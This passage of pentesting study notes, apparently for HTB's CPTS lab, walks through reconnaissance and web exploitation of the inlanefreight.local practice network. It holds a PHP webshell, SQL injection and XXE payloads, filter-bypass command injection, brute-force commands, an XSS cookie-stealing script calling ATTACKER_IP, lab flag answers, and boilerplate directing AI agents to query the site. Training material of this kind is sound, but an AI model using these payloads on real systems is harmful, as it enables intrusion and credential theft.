@@ -1,0 +1,3692 @@
+---
+title: "Attacking Enterprise Networks"
+---
+
+- [External Information Gathering](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/external-information-gathering.md)
+- [Service Enumeration & Exploitation](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/service-enumeration-exploitation.md)
+- [Web Enumeration & Exploitation](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/web-enumeration-exploitation.md)
+- [Initial Access](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/initial-access.md)
+- [Post-Exploitation Persistence](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/post-exploitation-persistence.md)
+- [Internal Information Gathering](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/internal-information-gathering.md)
+- [Exploitation & Privilege Escalation](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/exploitation-privilege-escalation.md)
+- [Lateral Movement](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/lateral-movement.md)
+- [Active Directory Compromise](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/active-directory-compromise.md)
+- [Post-Exploitation](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/post-exploitation.md)
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## External Information Gathering
+
+## 🎯 Overview
+
+**External Information Gathering** is the critical first phase of enterprise network attacks. This process involves **systematic reconnaissance** to map the attack surface, identify services, discover subdomains, and gather intelligence for targeted exploitation against external-facing infrastructure.
+
+## 🔍 Initial Network Reconnaissance
+
+### 📊 Quick Port Discovery
+
+```bash wrap
+# Initial top 1000 ports scan
+sudo nmap --open -oA target_tcp_1k -iL scope
+
+# Key findings analysis:
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+110/tcp  open  pop3
+143/tcp  open  imap
+993/tcp  open  imaps
+995/tcp  open  pop3s
+8080/tcp open  http-proxy
+
+# Service categories identified:
+- Web services (80, 8080)
+- Email services (25, 110, 143, 993, 995)
+- File transfer (21)
+- Remote access (22)
+- DNS services (53)
+```
+
+### 🔧 Comprehensive Service Enumeration
+
+```bash wrap
+# Full port aggressive scan
+sudo nmap --open -p- -A -oA target_tcp_all_svc -iL scope
+
+# Key service discoveries:
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+25/tcp   open  smtp     Postfix smtpd
+53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
+
+# Anonymous FTP access discovered:
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
+```
+
+### 📈 Service Analysis with Nmap Grep
+
+```bash wrap
+# Extract service information efficiently
+egrep -v "^#|Status: Up" target_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \
+sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
+
+# Results:
+      2 Dovecot pop3d
+      2 Dovecot imapd (Ubuntu)
+      2 Apache httpd 2.4.41 ((Ubuntu))
+      1 vsftpd 3.0.3
+      1 Postfix smtpd
+      1 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+      1 2-4 (RPC #100000)
+```
+
+## 🌐 DNS Enumeration
+
+### 📋 DNS Zone Transfer Attack
+
+```bash wrap
+# Attempt zone transfer for subdomain discovery
+dig axfr inlanefreight.local @TARGET_IP
+
+# Successful zone transfer results:
+inlanefreight.local.     86400  IN  SOA   ns1.inlanfreight.local. dnsadmin.inlanefreight.local.
+blog.inlanefreight.local.     86400  IN  A    127.0.0.1
+careers.inlanefreight.local.  86400  IN  A    127.0.0.1
+dev.inlanefreight.local.      86400  IN  A    127.0.0.1
+flag.inlanefreight.local.     86400  IN  TXT  "HTB{..."
+gitlab.inlanefreight.local.   86400  IN  A    127.0.0.1
+ir.inlanefreight.local.       86400  IN  A    127.0.0.1
+status.inlanefreight.local.   86400  IN  A    127.0.0.1
+support.inlanefreight.local.  86400  IN  A    127.0.0.1
+tracking.inlanefreight.local. 86400  IN  A    127.0.0.1
+vpn.inlanefreight.local.      86400  IN  A    127.0.0.1
+
+# Discovery: 9 additional subdomains + flag in TXT record
+```
+
+### 🔍 Alternative DNS Enumeration
+
+```bash wrap
+# If zone transfer fails, use passive methods:
+# - DNSDumpster.com
+# - Certificate transparency logs
+# - Search engine dorking
+# - Subdomain brute forcing
+
+# Active subdomain enumeration:
+ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.local
+```
+
+## 🌐 Virtual Host Discovery
+
+### 📊 VHost Enumeration Process
+
+```bash wrap
+# Step 1: Determine invalid vhost response size
+curl -s -I http://TARGET_IP -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
+# Result: Content-Length: 15157
+
+# Step 2: Fuzz vhosts filtering invalid responses
+ffuf -w /opt/useful/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://TARGET_IP/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
+
+# Results discovered:
+blog                    [Status: 200, Size: 8708]
+careers                 [Status: 200, Size: 51810]
+dev                     [Status: 200, Size: 2048]
+gitlab                  [Status: 302, Size: 113]
+ir                      [Status: 200, Size: 28545]
+monitoring              [Status: 200, Size: 56]    # ← Additional vhost not in DNS
+status                  [Status: 200, Size: 917]
+support                 [Status: 200, Size: 26635]
+tracking                [Status: 200, Size: 35185]
+vpn                     [Status: 200, Size: 1578]
+```
+
+### 🔧 Alternative VHost Tools
+
+```bash wrap
+# Gobuster vhost enumeration
+gobuster vhost -u http://TARGET_IP -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain inlanefreight.local
+
+# Wfuzz vhost discovery
+wfuzz -c -f sub-fighter -w /opt/useful/seclists/Discovery/DNS/namelist.txt -u "http://TARGET_IP" -H "Host: FUZZ.inlanefreight.local" --hh 15157
+```
+
+## 📝 Host File Configuration
+
+### 🔧 Adding Discovered Hosts
+
+```bash wrap
+# Add all discovered subdomains to /etc/hosts
+sudo tee -a /etc/hosts > /dev/null <<EOT
+
+## inlanefreight hosts 
+TARGET_IP inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local monitoring.inlanefreight.local
+EOT
+
+# Verify configuration
+cat /etc/hosts | grep inlanefreight
+```
+
+## 🎯 HTB Academy Lab Solutions
+
+### Lab Environment
+
+```bash wrap
+# Target: 10.129.211.225 (ACADEMY-AEN-DMZ01)
+# Add to /etc/hosts:
+sudo sh -c 'echo "TARGET_IP inlanefreight.local" >> /etc/hosts'
+```
+
+### 🔍 Question 1: Banner Grab Non-Standard Service
+
+```bash wrap
+# Service enumeration with version detection
+sudo nmap -sC -sV inlanefreight.local
+
+# Key finding in DNS service:
+53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
+| dns-nsid:
+|_  bind.version: 1337_HTB_DNS
+
+# Answer: 1337_HTB_DNS
+```
+
+### 🌐 Question 2: DNS Zone Transfer Flag
+
+```bash wrap
+# Perform zone transfer
+dig AXFR inlanefreight.local @TARGET_IP
+
+# Flag discovered in TXT record:
+flag.inlanefreight.local. 86400  IN  TXT  "HTB{..."
+
+# Answer: HTB{DNs_ZOn3_Tr@nsf3r}
+```
+
+### 📍 Question 3: Flag Subdomain FQDN
+
+```bash wrap
+# From zone transfer output:
+flag.inlanefreight.local. 86400  IN  TXT  "HTB{..."
+
+# Answer: flag.inlanefreight.local
+```
+
+### 🔍 Question 4: Additional VHost Discovery
+
+```bash wrap
+# Determine invalid response size
+curl -sI http://TARGET_IP/ -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"
+# Result: Content-Length: 15157
+
+# Fuzz for additional vhosts
+ffuf -s -w /opt/useful/SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://TARGET_IP/ -H 'Host: FUZZ.inlanefreight.local' -fs 15157
+
+# Additional vhost found:
+monitoring              [Status: 200, Size: 56]
+
+# Answer: monitoring
+```
+
+## 🔄 Information Gathering Workflow
+
+### 📊 Systematic Approach
+
+```bash wrap
+# 1. Initial port discovery
+sudo nmap --open -oA quick_scan -iL scope
+
+# 2. Service enumeration
+sudo nmap --open -p- -A -oA full_scan -iL scope
+
+# 3. DNS zone transfer attempt
+dig axfr DOMAIN @TARGET_IP
+
+# 4. Subdomain/vhost discovery
+ffuf -w wordlist -u http://TARGET/ -H 'Host:FUZZ.domain' -fs INVALID_SIZE
+
+# 5. Host file configuration
+sudo tee -a /etc/hosts <<< "TARGET_IP domain subdomain1.domain subdomain2.domain"
+
+# 6. Service-specific enumeration
+# Continue with FTP, HTTP, SMTP, etc. detailed analysis
+```
+
+### 🎯 Attack Surface Mapping
+
+```cmd wrap
+# Service categorization:
+Web Services:     80, 443, 8080, 8443
+Email Services:   25, 110, 143, 587, 993, 995
+File Transfer:    21, 22, 69, 873
+Database:         1433, 3306, 5432, 1521
+Management:       161, 623, 8080, 9090
+Remote Access:    22, 23, 3389, 5985, 5986
+
+# Priority targets:
+1. Web applications (immediate attack surface)
+2. Anonymous/weak authentication services
+3. Known vulnerable service versions
+4. Management interfaces
+5. Email services for user enumeration
+```
+
+## ⚠️ Reconnaissance Best Practices
+
+### 🔒 Stealth Considerations
+
+```bash wrap
+# Timing controls for stealth
+nmap -T2 --scan-delay 5s TARGET_IP
+
+# Fragmented packets
+nmap -f TARGET_IP
+
+# Source port spoofing
+nmap --source-port 53 TARGET_IP
+
+# Decoy scanning
+nmap -D RND:10 TARGET_IP
+```
+
+### 📋 Documentation Standards
+
+```cmd wrap
+# Essential documentation:
+- All scan outputs saved with timestamps
+- Service version information recorded
+- Subdomain/vhost discovery results
+- Anonymous access findings
+- Potential attack vectors identified
+- Evidence screenshots for findings
+```
+
+## 💡 Key Takeaways
+
+1. **Systematic enumeration** reveals complete attack surface
+2. **DNS zone transfers** provide valuable subdomain intelligence
+3. **VHost discovery** uncovers hidden applications
+4. **Service versioning** enables vulnerability research
+5. **Anonymous access** often provides immediate foothold opportunities
+6. **Comprehensive documentation** essential for attack planning
+7. **Multiple enumeration methods** ensure complete coverage
+
+***
+
+*External information gathering establishes the foundation for enterprise network attacks by mapping the complete external attack surface and identifying high-value targets for exploitation.*
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/external-information-gathering.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Service Enumeration & Exploitation
+
+## 🎯 Overview
+
+**Service enumeration and exploitation** focuses on systematically testing discovered services for vulnerabilities, misconfigurations, and attack vectors. This phase moves from reconnaissance to active testing of **FTP**, **SSH**, **SMTP**, **DNS**, **HTTP**, and **email services**.
+
+## 📊 Discovered Services Analysis
+
+### 🔍 Service Inventory
+
+```cmd wrap
+# Primary services identified:
+Port 21:  FTP (vsftpd 3.0.3)
+Port 22:  SSH (OpenSSH 8.2p1)
+Port 25:  SMTP (Postfix smtpd)
+Port 53:  DNS (custom banner)
+Port 80:  HTTP (Apache 2.4.41)
+Port 110/143/993/995: Email (Dovecot)
+Port 111: rpcbind
+Port 8080: HTTP (Apache 2.4.41)
+
+# Attack priority:
+1. Anonymous/weak authentication services
+2. Web applications (multiple HTTP ports)
+3. Email services for user enumeration
+4. Misconfigured network services
+```
+
+## 📁 FTP Service Testing
+
+### 🔓 Anonymous Access Validation
+
+```bash wrap
+# Manual FTP connection test
+ftp TARGET_IP
+
+# Login attempt:
+Name: anonymous
+Password: [blank or any string]
+# Result: 230 Login successful
+
+# Directory listing:
+ftp> ls
+-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
+
+# File retrieval:
+ftp> get flag.txt
+ftp> !cat flag.txt
+# Result: HTB{...} flag discovered
+```
+
+### 🔧 FTP Security Assessment
+
+```bash wrap
+# Upload permission testing:
+ftp> put test.txt
+# Result: 550 Permission denied (read-only access)
+
+# Directory traversal testing:
+ftp> cd ..
+# Result: Limited directory access
+
+# Additional enumeration:
+ftp> pwd          # Current directory
+ftp> passive      # Passive mode testing
+ftp> binary       # Binary transfer mode
+```
+
+### 📋 FTP Attack Vectors
+
+```cmd wrap
+# Common FTP attacks tested:
+- Anonymous access (SUCCESSFUL)
+- File upload capabilities (DENIED)
+- Directory traversal (LIMITED)
+- FTP bounce attacks (NOT APPLICABLE)
+- Brute force attacks (NO USERNAMES)
+
+# Vulnerability research:
+- vsFTPd 3.0.3: Only DoS exploits available
+- No RCE vulnerabilities for this version
+- Configuration appears secure except anonymous read
+```
+
+## 🔑 SSH Service Assessment
+
+### 📊 Version Analysis
+
+```bash wrap
+# Banner grabbing:
+nc -nv TARGET_IP 22
+# Result: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+
+# Vulnerability research:
+# OpenSSH 8.2p1: No known RCE vulnerabilities
+# Modern, patched version
+# Brute force unlikely without usernames
+```
+
+### 🔧 Authentication Testing
+
+```bash wrap
+# Common credential testing:
+ssh admin@TARGET_IP     # admin:admin
+ssh root@TARGET_IP      # root:toor
+ssh admin@TARGET_IP     # admin:Welcome
+ssh admin@TARGET_IP     # admin:Pass123
+
+# Results: All authentication attempts failed
+# Recommendation: SSH appears properly configured
+```
+
+## 📧 Email Services Enumeration
+
+### 📋 SMTP Configuration Analysis
+
+```bash wrap
+# Detailed SMTP enumeration:
+sudo nmap -sV -sC -p25 TARGET_IP
+
+# SMTP commands supported:
+# PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, 
+# ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+
+# Key finding: VRFY command enabled (user enumeration)
+```
+
+### 👤 User Enumeration via SMTP
+
+```bash wrap
+# VRFY command testing:
+telnet TARGET_IP 25
+
+# Commands:
+220 ubuntu ESMTP Postfix (Ubuntu)
+VRFY root
+252 2.0.0 root              # ← Valid user
+VRFY www-data  
+252 2.0.0 www-data          # ← Valid user
+VRFY randomuser
+550 5.1.1 <randomuser>: Recipient address rejected: User unknown
+
+# Finding: VRFY command enables user enumeration
+# Risk level: Low (information disclosure)
+```
+
+### 🔧 Advanced SMTP Testing
+
+```bash wrap
+# Additional enumeration commands:
+EXPN root           # Expand mailing lists
+RCPT TO: <user>     # Recipient verification
+
+# Automated user enumeration:
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t TARGET_IP
+
+# Open relay testing:
+nmap -p25 -Pn --script smtp-open-relay TARGET_IP
+# Result: Server doesn't seem to be an open relay
+```
+
+## 📮 POP3/IMAP Testing
+
+### 🔍 Authentication Analysis
+
+```bash wrap
+# POP3 connection testing:
+telnet TARGET_IP 110
+
+# Commands:
++OK Dovecot (Ubuntu) ready.
+user www-data
+-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections
+
+# Finding: Secure configuration requiring SSL/TLS
+# Result: No plaintext authentication allowed
+```
+
+### 🔒 Secure Email Port Testing
+
+```bash wrap
+# SSL/TLS email ports:
+Port 993: SSL/TLS IMAP
+Port 995: SSL/TLS POP3
+
+# Testing approach:
+openssl s_client -connect TARGET_IP:993
+openssl s_client -connect TARGET_IP:995
+
+# Certificate analysis for additional information
+```
+
+## 🌐 RPC Service Assessment
+
+### 📊 rpcbind Enumeration
+
+```bash wrap
+# RPC service information:
+rpcinfo TARGET_IP
+
+# Results:
+program version netid     address                service    owner
+100000    4    tcp       0.0.0.0.0.111          portmapper superuser
+100000    3    tcp       0.0.0.0.0.111          portmapper superuser
+100000    2    tcp       0.0.0.0.0.111          portmapper superuser
+
+# Finding: RPC service exposed externally
+# Risk level: Low (unnecessary external exposure)
+# Recommendation: Block external access to RPC services
+```
+
+## 🎯 HTB Academy Lab Solution
+
+### Lab Environment
+
+```bash wrap
+# Target: 10.129.211.225 (ACADEMY-AEN-DMZ01)
+# Ensure /etc/hosts entry exists:
+sudo sh -c 'echo "TARGET_IP inlanefreight.local" >> /etc/hosts'
+```
+
+### 📁 Question: Enumerate Services and Find Flag
+
+```bash wrap
+# Service enumeration reveals anonymous FTP access
+# Connect to FTP service:
+ftp TARGET_IP
+
+# Login with anonymous credentials:
+Name: anonymous
+Password: [blank]
+# Result: 230 Login successful
+
+# List files:
+ftp> ls
+-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
+
+# Download and read flag:
+ftp> get flag.txt
+ftp> !cat flag.txt
+
+# Answer: HTB{...} (flag content discovered)
+```
+
+## 🔄 Service Testing Methodology
+
+### 📋 Systematic Approach
+
+```bash wrap
+# 1. Service identification
+sudo nmap -sV -sC -p- TARGET_IP
+
+# 2. Anonymous access testing
+# FTP, SMTP, RPC, HTTP directories
+
+# 3. Authentication bypass attempts
+# Default credentials, common passwords
+
+# 4. Misconfiguration discovery
+# User enumeration, open relays, unnecessary services
+
+# 5. Vulnerability research
+# CVE lookup for service versions
+# Public exploit availability
+
+# 6. Documentation
+# Finding severity assessment
+# Evidence collection
+# Remediation recommendations
+```
+
+### 🎯 Finding Categories
+
+```cmd wrap
+# High-risk findings:
+- Remote code execution vulnerabilities
+- Authentication bypass mechanisms
+- Sensitive data exposure
+
+# Medium-risk findings:
+- User enumeration capabilities
+- Weak authentication mechanisms
+- Service misconfigurations
+
+# Low-risk findings:
+- Information disclosure
+- Unnecessary service exposure
+- Version disclosure
+```
+
+## ⚠️ Testing Limitations
+
+### 🔒 Ethical Boundaries
+
+```cmd wrap
+# Avoid during external testing:
+- Aggressive brute force attacks
+- Service disruption attempts
+- Denial of service testing
+- Unauthorized data access beyond validation
+
+# Safe testing practices:
+- Limited authentication attempts
+- Non-disruptive enumeration
+- Read-only access validation
+- Minimal system interaction
+```
+
+### 📋 Documentation Requirements
+
+```cmd wrap
+# Essential evidence:
+- Service versions and configurations
+- Anonymous access capabilities
+- User enumeration results
+- Failed exploitation attempts
+- Security recommendations
+
+# Risk assessment:
+- Business impact evaluation
+- Exploit complexity analysis
+- Remediation effort estimates
+- Compliance implications
+```
+
+## 💡 Key Takeaways
+
+1. **Anonymous FTP access** often provides immediate foothold opportunities
+2. **User enumeration** via SMTP VRFY creates attack vectors
+3. **Service versioning** enables targeted vulnerability research
+4. **Email services** require SSL/TLS for secure authentication
+5. **RPC services** should not be externally exposed
+6. **Systematic testing** ensures comprehensive service coverage
+7. **Professional documentation** supports finding validation and remediation
+
+***
+
+*Service enumeration and exploitation systematically tests each discovered service for security weaknesses while maintaining ethical boundaries and comprehensive documentation standards.*
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/service-enumeration-exploitation.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Web Enumeration & Exploitation
+
+## 🎯 Overview
+
+**Web applications** present the **largest attack surface** during External Penetration Tests. Focus on **high-risk vulnerabilities** (RCE, data exposure) rather than minor issues. Use **EyeWitness** for efficient application discovery and **systematic testing** of each discovered service.
+
+## 🔍 Web Application Discovery
+
+### 📊 EyeWitness Automation
+
+```bash wrap
+# Subdomain list preparation
+cat > ilfreight_subdomains << EOF
+inlanefreight.local
+blog.inlanefreight.local
+careers.inlanefreight.local
+dev.inlanefreight.local
+gitlab.inlanefreight.local
+ir.inlanefreight.local
+status.inlanefreight.local
+support.inlanefreight.local
+tracking.inlanefreight.local
+vpn.inlanefreight.local
+monitoring.inlanefreight.local
+EOF
+
+# Automated screenshot capture
+eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
+```
+
+## 🌐 Application-by-Application Analysis
+
+### 📝 blog.inlanefreight.local - Drupal 9
+
+```bash wrap
+# Version detection
+curl -s http://blog.inlanefreight.local | grep Drupal
+# Output: Drupal 9 (current stable)
+
+# Assessment result:
+- No Drupalgeddon vulnerabilities (9.x not affected)
+- Admin authentication unsuccessful
+- User registration disabled
+- Recommendation: Remove unused test site
+```
+
+### 💼 careers.inlanefreight.local - Job Portal
+
+```bash wrap
+# Key findings:
+- User registration enabled
+- File upload functionality (any file type)
+- IDOR vulnerability in profile access
+
+# IDOR exploitation:
+http://careers.inlanefreight.local/profile?id=1  # Access other users
+http://careers.inlanefreight.local/profile?id=2  # Sensitive data exposure
+http://careers.inlanefreight.local/profile?id=3  # Job application details
+```
+
+### 🔧 dev.inlanefreight.local - Key Vault
+
+```bash wrap
+# Directory enumeration
+gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
+
+# Key discoveries:
+/uploads/               # Directory listing enabled
+/upload.php            # HTTP 403 but responds with 200
+
+# HTTP Verb Tampering exploitation:
+TRACK /upload.php HTTP/1.1
+Host: dev.inlanefreight.local
+X-Custom-IP-Authorization: 127.0.0.1
+
+# Result: File upload form revealed
+```
+
+### 🔺 Unrestricted File Upload Chain
+
+```bash wrap
+# 1. Create PHP webshell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# 2. Upload with Content-Type bypass
+Content-Type: image/png  # Instead of application/x-php
+
+# 3. Command execution
+curl "http://dev.inlanefreight.local/uploads/shell.php?cmd=id"
+# Output: uid=33(www-data) gid=33(www-data)
+```
+
+### 💰 ir.inlanefreight.local - WordPress
+
+```bash wrap
+# WPScan enumeration
+wpscan -e ap -t 500 --url http://ir.inlanefreight.local
+
+# Key findings:
+- WordPress 6.0 (latest)
+- mail-masta plugin (vulnerable to LFI)
+- Users: ilfreightwp, tom, james, john
+
+# LFI exploitation (Mail Masta plugin):
+curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+
+# Password brute force:
+wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
+# Result: ilfreightwp:password1
+
+# WordPress admin access → Theme editor → PHP shell injection
+```
+
+### 📊 status.inlanefreight.local - Log Search
+
+```bash wrap
+# SQL injection discovery
+Input: '
+Error: "MySQL syntax error near '%'' at line 1"
+
+# Manual UNION attack:
+' union select null, database(), user(), @@version -- //
+
+# SQLMap exploitation:
+sqlmap -r sqli.txt --dbms=mysql --dbs
+sqlmap -r sqli.txt --dbms=mysql -D status --tables
+sqlmap -r sqli.txt --dbms=mysql -D status -T users --dump
+```
+
+### 🎫 support.inlanefreight.local - IT Support Portal
+
+```bash wrap
+# XSS testing in ticket submission
+Payload: "><script src=http://ATTACKER_IP:9000/TESTING_THIS></script>
+
+# Blind XSS confirmation
+nc -lvnp 9000
+# Result: Connection from target with User-Agent: HTBXSS/1.0
+
+# Cookie stealing setup:
+# index.php - cookie logger
+# script.js - cookie exfiltration payload
+
+# Session hijacking result:
+# Admin session cookie captured → Dashboard access
+```
+
+### 📦 tracking.inlanefreight.local - PDF Generator
+
+```bash wrap
+# HTML injection testing
+Input: <h1>test</h1>
+Result: Rendered in PDF tracking field
+
+# SSRF to Local File Read
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+
+# Result: Local file contents displayed in generated PDF
+```
+
+### 🔐 vpn.inlanefreight.local - Fortinet SSL VPN
+
+```bash wrap
+# Assessment result:
+- Current version (no known CVEs)
+- Common credentials unsuccessful
+- Potential password spraying target
+- Access denied error message
+```
+
+### 🦊 gitlab.inlanefreight.local - GitLab Instance
+
+```bash wrap
+# Misconfiguration assessment:
+- User registration enabled (no admin approval)
+- Public project access available
+- shopdev2.inlanefreight.local project discovered
+
+# Security issues:
+- No domain restrictions on registration
+- Sensitive project exposure
+- Development environment discovery
+```
+
+### 🛒 shopdev2.inlanefreight.local - Shopping Cart
+
+```bash wrap
+# Authentication testing:
+admin:admin  # Successful login (weak credentials)
+
+# XXE vulnerability in checkout process:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE userid [
+  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <subtotal>undefined</subtotal>
+    <userid>&xxetest;</userid>
+</root>
+
+# Result: Local file read capability
+```
+
+### 📊 monitoring.inlanefreight.local - Monitoring Console
+
+```bash wrap
+# Authentication brute force:
+hydra -l admin -P passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
+# Result: admin:12qwaszx
+
+# Restricted shell analysis:
+Available commands: ls, cat, whoami, date, help, clear, reboot, cd, mv, rm, rmdir, touch, connection_test
+
+# Command injection in connection_test:
+GET /ping.php?ip=127.0.0.1%0a'i'd
+# Bypass: %0a (newline) + single quotes around commands
+
+# Filter analysis:
+Blocked: &, |, ;, \, /, space, whoami, echo, rm, etc.
+Bypass: ${IFS} for spaces, %0a for command separation
+
+# Network discovery:
+IP addresses: 10.129.203.101 (external), 172.16.8.120 (internal)
+# Pivot opportunity into internal network
+```
+
+## 🎯 Key Vulnerabilities Discovered
+
+### 🔴 High Risk Findings
+
+```cmd wrap
+1. Unrestricted File Upload (dev.inlanefreight.local)
+2. HTTP Verb Tampering (dev.inlanefreight.local)  
+3. Local File Inclusion (ir.inlanefreight.local)
+4. Weak WordPress Credentials (ir.inlanefreight.local)
+5. SQL Injection (status.inlanefreight.local)
+6. Cross-Site Scripting (support.inlanefreight.local)
+7. SSRF to Local File Read (tracking.inlanefreight.local)
+8. Misconfigured GitLab Instance (gitlab.inlanefreight.local)
+9. XML External Entity Injection (shopdev2.inlanefreight.local)
+10. Command Injection (monitoring.inlanefreight.local)
+11. Weak Authentication (multiple applications)
+```
+
+### 🟡 Medium Risk Findings
+
+```cmd wrap
+1. Directory Listing Enabled (dev.inlanefreight.local)
+2. IDOR - User Profile Access (careers.inlanefreight.local)
+3. Abandoned Test Applications (blog.inlanefreight.local)
+```
+
+## 🚀 Attack Chain Summary
+
+### 🎯 External → Internal Pivot Path
+
+```bash wrap
+# 1. External reconnaissance
+Nmap scans → Service discovery → Subdomain enumeration
+
+# 2. Web application testing
+EyeWitness → Individual app analysis → Vulnerability discovery
+
+# 3. Initial foothold options:
+- PHP webshell via file upload (dev.inlanefreight.local)
+- WordPress theme editor (ir.inlanefreight.local)  
+- Command injection (monitoring.inlanefreight.local)
+
+# 4. Internal network access:
+monitoring.inlanefreight.local → 172.16.8.120 interface
+→ Pivot into internal AD environment
+```
+
+## 🔧 Tools & Techniques Used
+
+### 🌐 Web Enumeration
+
+```bash wrap
+# Application discovery
+eyewitness -f subdomain_list -d output_dir
+
+# Directory brute forcing  
+gobuster dir -u TARGET -w wordlist -x .php -t 300
+
+# WordPress enumeration
+wpscan -e ap,u -t 500 --url TARGET
+
+# Password brute forcing
+hydra -l admin -P wordlist TARGET http-post-form "PATH:PARAMS:FAIL_STRING"
+```
+
+### ⚔️ Exploitation Techniques
+
+```bash wrap
+# File upload bypass
+Content-Type: image/png  # MIME type manipulation
+
+# SQL injection
+sqlmap -r request.txt --dbms=mysql --dump -D database -T table
+
+# XSS cookie stealing
+<script src=http://ATTACKER/script.js></script>
+
+# XXE local file read
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+# Command injection bypass
+%0a'command'  # Newline + single quotes
+${IFS}        # Space bypass using environment variable
+```
+
+## 🎯 HTB Academy Labs
+
+### 📋 Lab Solutions Summary
+
+```cmd wrap
+Lab 1: IDOR vulnerability → Profile enumeration → Flag discovery
+Lab 2: HTTP verb tampering → File upload → Webshell execution  
